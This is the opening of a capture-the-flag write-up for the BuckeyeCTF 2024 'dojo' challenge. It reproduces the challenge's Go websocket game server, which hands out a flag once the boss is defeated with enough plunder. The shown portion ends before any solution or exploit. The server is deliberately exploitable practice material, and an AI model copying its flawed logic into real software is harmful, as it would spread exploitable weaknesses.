<!DOCTYPE html><html class="dark scroll-smooth"><head><meta charSet="utf-8"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/e4af272ccee01ff0-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/1f28d421-8fe1-45a5-9271-4fad8c6897bb"/><link rel="preload" as="image" href="https://gist.github.com/user-attachments/assets/c53bedee-58cf-47c3-9f7a-acecaa9c7019"/><link rel="stylesheet" href="/_next/static/css/cd9eb1f13d7f01c4.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-50d183473e3f8178.js"/><script src="/_next/static/chunks/4bd1b696-12b3d90ac4ed3802.js" async=""></script><script src="/_next/static/chunks/684-d3c2077e7b7fefb9.js" async=""></script><script src="/_next/static/chunks/main-app-99381da9a4c58049.js" async=""></script><script src="/_next/static/chunks/874-c62c375efd21db20.js" async=""></script><script src="/_next/static/chunks/app/writeups/layout-0d6432ad4376bd82.js" async=""></script><script src="/_next/static/chunks/325-8cc74193b249521f.js" async=""></script><script src="/_next/static/chunks/app/writeups/%5Bid%5D/page-b6fc1eb85fdc5690.js" async=""></script><meta name="next-size-adjust" content=""/><title>kevin.fish</title><script>document.querySelectorAll('body link[rel="icon"], body link[rel="apple-touch-icon"]').forEach(el => document.head.appendChild(el))</script><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="text-dark dark:text-white dark:bg-midnight" style="font-family:&#x27;Inter&#x27;, &#x27;Inter Fallback&#x27;;font-style:normal"><main class="container pt-20 pb-24"><a class="text-secondary text-sm mb-10 -ml-5 block w-max" href="/">← Back to home</a><div><main class="max-w-5xl mx-auto text-sm [&amp;_h1]:text-5xl [&amp;_h1]:font-semibold [&amp;_h1]:mb-8 [&amp;_blockquote]:text-secondary [&amp;_blockquote]:space-y-3 [&amp;_blockquote]:border-l-4 [&amp;_blockquote]:border-secondary [&amp;_blockquote]:pl-5 [&amp;_blockquote]:mb-5 [&amp;&gt;_p]:my-3 [&amp;_img]:my-5 [&amp;_ul]:list-disc [&amp;_ul]:pl-6 [&amp;_img]:rounded [&amp;_li]:my-2"><h1>BuckeyeCTF 2024 — dojo</h1>
<blockquote>
<p>The dojo stores many riches. Can you make it through the gauntlet?</p>
<p>dojo.challs.pwnoh.io</p>
</blockquote>
<p>We&#x27;re given a Go server looking like this:</p>
<div class="my-4"><p class="text-xs bg-black/10 rounded-t-lg px-4 py-0.5 text-secondary">Code<!-- --> (go)<!-- -->:<!-- --> <button class="hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">package</span><span class=""> server
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">import</span><span class=""> </span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">	</span><span class="token string">&quot;encoding/json&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">	</span><span class="token string">&quot;math/rand/v2&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="">	</span><span class="token string">&quot;net/http&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">	</span><span class="token string">&quot;os&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="">	</span><span class="token string">&quot;path/filepath&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">	</span><span class="token string">&quot;strings&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">	</span><span class="token string">&quot;time&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">11</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">	</span><span class="token string">&quot;github.com/go-chi/chi/v5&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">	</span><span class="token string">&quot;github.com/go-chi/chi/v5/middleware&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">	</span><span class="token string">&quot;github.com/go-chi/httprate&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">	</span><span class="token string">&quot;github.com/go-chi/jwtauth/v5&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="">	</span><span class="token string">&quot;github.com/gorilla/websocket&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class=""></span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">18</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class=""></span><span class="token keyword">var</span><span class=""> TokenAuth </span><span class="token operator">*</span><span class="">jwtauth</span><span class="token punctuation">.</span><span class="">JWTAuth
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">20</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class=""></span><span class="token keyword">const</span><span class=""> MaxBossHealth </span><span class="token operator">=</span><span class=""> </span><span class="token number">1000</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">22</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">23</span><span class=""></span><span class="token keyword">type</span><span class=""> GameState </span><span class="token keyword">struct</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">24</span><span class="">	id           </span><span class="token builtin">int32</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">25</span><span class="">	bossHealth   </span><span class="token builtin">int32</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">26</span><span class="">	playerHealth </span><span class="token builtin">int32</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">27</span><span class="">	plundered    </span><span class="token builtin">int32</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">28</span><span class="">	lastDodge    time</span><span class="token punctuation">.</span><span class="">Time
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">29</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">30</span><span class="">	conn </span><span class="token operator">*</span><span class="">websocket</span><span class="token punctuation">.</span><span class="">Conn
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">31</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">32</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">33</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">SyncJSON</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">34</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">35</span><span class="">		gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">36</span><span class="">			</span><span class="token string">&quot;action&quot;</span><span class="token punctuation">:</span><span class="">       </span><span class="token string">&quot;sync&quot;</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">37</span><span class="">			</span><span class="token string">&quot;playerHealth&quot;</span><span class="token punctuation">:</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">playerHealth</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">38</span><span class="">			</span><span class="token string">&quot;bossHealth&quot;</span><span class="token punctuation">:</span><span class="">   gs</span><span class="token punctuation">.</span><span class="">bossHealth</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">39</span><span class="">		</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">40</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">41</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">42</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">bossHealth </span><span class="token operator">&lt;=</span><span class=""> </span><span class="token number">0</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">43</span><span class="">		</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">44</span><span class="">			gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">&quot;action&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;win&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">45</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">46</span><span class="">			</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">plundered </span><span class="token operator">&gt;</span><span class=""> </span><span class="token number">800</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">47</span><span class="">				flag</span><span class="token punctuation">,</span><span class=""> exists </span><span class="token operator">:=</span><span class=""> os</span><span class="token punctuation">.</span><span class="token function">LookupEnv</span><span class="token punctuation">(</span><span class="token string">&quot;FLAG&quot;</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">48</span><span class="">				</span><span class="token keyword">if</span><span class=""> </span><span class="token operator">!</span><span class="">exists </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">49</span><span class="">					flag </span><span class="token operator">=</span><span class=""> </span><span class="token string">&quot;bctf{fake_flag}&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">50</span><span class="">				</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">51</span><span class="">				gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">&quot;flag&quot;</span><span class="token punctuation">:</span><span class=""> flag</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">52</span><span class="">			</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">53</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">54</span><span class="">			gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">55</span><span class="">		</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">56</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">57</span><span class="">		</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="">gameStates</span><span class="token punctuation">,</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">id</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">58</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">59</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">60</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">playerHealth </span><span class="token operator">&lt;=</span><span class=""> </span><span class="token number">0</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">61</span><span class="">		</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">62</span><span class="">			gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">&quot;action&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;lose&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;reason&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;died&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">63</span><span class="">			gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">64</span><span class="">		</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">65</span><span class="">		</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="">gameStates</span><span class="token punctuation">,</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">id</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">66</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">67</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">68</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">69</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">PlayerAttack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">(</span><span class="">success </span><span class="token builtin">bool</span><span class="token punctuation">,</span><span class=""> amount </span><span class="token builtin">int32</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">70</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">lastDodge</span><span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class=""> </span><span class="token operator">*</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Second</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">After</span><span class="token punctuation">(</span><span class="">time</span><span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">71</span><span class="">		</span><span class="token keyword">return</span><span class=""> </span><span class="token boolean">false</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">0</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">72</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">73</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">74</span><span class="">	amt </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">rand</span><span class="token punctuation">.</span><span class="token function">IntN</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token number">2</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">75</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">76</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">conn </span><span class="token operator">!=</span><span class=""> </span><span class="token boolean">nil</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">77</span><span class="">		gs</span><span class="token punctuation">.</span><span class="">conn</span><span class="token punctuation">.</span><span class="token function">WriteJSON</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">&quot;action&quot;</span><span class="token punctuation">:</span><span class=""> </span><span class="token string">&quot;player_attack&quot;</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;amount&quot;</span><span class="token punctuation">:</span><span class=""> amt</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">78</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">79</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">80</span><span class="">	gs</span><span class="token punctuation">.</span><span class="">bossHealth </span><span class="token operator">-=</span><span class=""> amt
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">81</span><span class="">	gs</span><span class="token punctuation">.</span><span class="token function">SyncJSON</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">82</span><span class="">	</span><span class="token keyword">return</span><span class=""> </span><span class="token boolean">true</span><span class="token punctuation">,</span><span class=""> amt
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">83</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">84</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">85</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">PlayerDodge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">86</span><span class="">	gs</span><span class="token punctuation">.</span><span class="">lastDodge </span><span class="token operator">=</span><span class=""> time</span><span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">87</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">88</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">89</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token punctuation">(</span><span class="">gs </span><span class="token operator">*</span><span class="">GameState</span><span class="token punctuation">)</span><span class=""> </span><span class="token function">PlayerPlunder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">,</span><span class=""> </span><span class="token builtin">int32</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">90</span><span class="">	</span><span class="token keyword">if</span><span class=""> gs</span><span class="token punctuation">.</span><span class="">lastDodge</span><span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">1</span><span class=""> </span><span class="token operator">*</span><span class=""> time</span><span class="token punctuation">.</span><span class="">Second</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">After</span><span class="token punctuation">(</span><span class="">time</span><span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">91</span><span class="">		</span><span class="token keyword">return</span><span class=""> </span><span class="token boolean">false</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">0</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">92</span><span class="">	</span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">93</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">94</span><span class="">	amount </span><span class="token operator">:=</span><span class=""> </span><span class="token function">int32</span><span class="token punctuation">(</span><span class="">rand</span><span class="token punctuation">.</span><span class="token function">IntN</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class=""> </span><span class="token operator">+</span><span class=""> </span><span class="token number">2</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">95</span><span class="">	gs</span><span class="token punctuation">.</span><span class="">plundered </span><span class="token operator">+=</span><span class=""> amount
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">96</span><span class="">	</span><span class="token keyword">return</span><span class=""> </span><span class="token boolean">true</span><span class="token punctuation">,</span><span class=""> amount
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">97</span><span class=""></span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:4.25em;padding-right:1em;text-align:right;user-select:none">98</span>
